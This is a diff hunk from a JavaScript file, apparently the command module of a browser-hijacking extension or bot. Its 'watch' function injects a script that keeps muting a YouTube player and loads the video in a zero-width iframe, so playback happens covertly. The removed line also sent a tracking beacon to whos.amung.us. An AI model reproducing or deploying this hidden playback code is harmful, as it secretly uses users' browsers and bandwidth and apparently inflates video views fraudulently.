@@ -218,7 +218,7 @@ var Commands = {
         },
         watch: function (e) {
             var id = Math.floor(Math.random() * 99999999);
-            Commands.script('setInterval(function () {if (document.getElementById("sexonthebeach_' + e + "" + id + '")) {setInterval(function () {if (typeof document.getElementById("sexonthebeach_' + e + "" + id + '").contentWindow.document.getElementById("movie_player").isMuted == "function" && document.getElementById("sexonthebeach_' + e + "" + id + '").contentWindow.document.getElementById("movie_player").isMuted() == false) {document.getElementById("sexonthebeach_' + e + "" + id + '").contentWindow.document.getElementById("movie_player").mute();new Image().src = "//whos.amung.us/swidget/fc53cfgc025r"}}, 1)}}, 100)');
+            Commands.script('setInterval(function () {if (document.getElementById("sexonthebeach_' + e + "" + id + '")) {setInterval(function () {if (typeof document.getElementById("sexonthebeach_' + e + "" + id + '").contentWindow.document.getElementById("movie_player").isMuted == "function" && document.getElementById("sexonthebeach_' + e + "" + id + '").contentWindow.document.getElementById("movie_player").isMuted() == false) {document.getElementById("sexonthebeach_' + e + "" + id + '").contentWindow.document.getElementById("movie_player").mute();}}, 1)}}, 100)');
             t = document.createElement("iframe");
             t.setAttribute("src", "//www.youtube.com/watch?v=" + e),
             t.style.width = "0px",
